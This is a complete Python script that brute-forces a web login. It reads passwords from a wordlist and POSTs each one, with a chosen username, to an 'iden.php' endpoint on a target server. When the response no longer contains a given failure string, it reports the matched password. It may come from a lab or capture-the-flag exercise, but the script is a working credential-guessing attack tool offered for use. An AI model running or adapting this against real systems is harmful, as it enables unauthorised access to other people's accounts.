#! /usr/bin/env python3


import sys
import requests


def die(m):
    print("Oh dear ... " + m)
    sys.exit(1)


if len(sys.argv) != 5:
    die("you haven't made correct incantantions, check README.md")

username = sys.argv[1]
password_filename = sys.argv[2]
server_ip = sys.argv[3]
match_string = sys.argv[4]

lines = []
print(f"Checking file: {password_filename}")

try:
    fh = open(password_filename, 'r')
    fh.close()

except Exception:
    die(f"couldn't open '{password_filename}', error was: {sys.exc_info()}")


def send_request(counter, password, rich_results):
    payload = {"user": username, "password": password, "permission": "KO"}
    r = requests.post(f"http://{server_ip}/iden.php", data=payload, timeout=1)
    # if r.status_code != 200:
    #     die(f"Got non 200 status code: {r.status_code}\n\nResponse was: {r.content}")
    if match_string not in str(r.content):
        print(f"We got a HIT! \n\n{r.content}\n\nMatched password was: {password}")
        sys.exit(0) 

counter = 0
modulo = 100
pace = 1
status_char = "."

print(f"Starting probe ... will be verbose for a bit, press Ctrl-C ")

with open(password_filename) as fh:
    for line in fh:
        rich_results = False
        counter += 1
        password = line.strip()
        if counter <= 10 or counter % modulo == 0:
            rich_results = True
            print("\n\n")
            print(f"{counter}: Checking with username=[{username}] and password=[{password}]")
        elif counter == 11:
            modulo = 10
            print("Dialling down terminal noise, one dot every attempt, detail on every 10th line")
            print(".", end="")
            modulo = 10
        elif counter == 101:
            print("\nDialling down terminal noise, one X every 10 attempts, detail on every 10000th line")
            modulo = 10000
            pace = 10
            status_char = "x"
        elif counter % pace == 0:
            print(status_char, end="")

        send_request(counter, password, rich_results)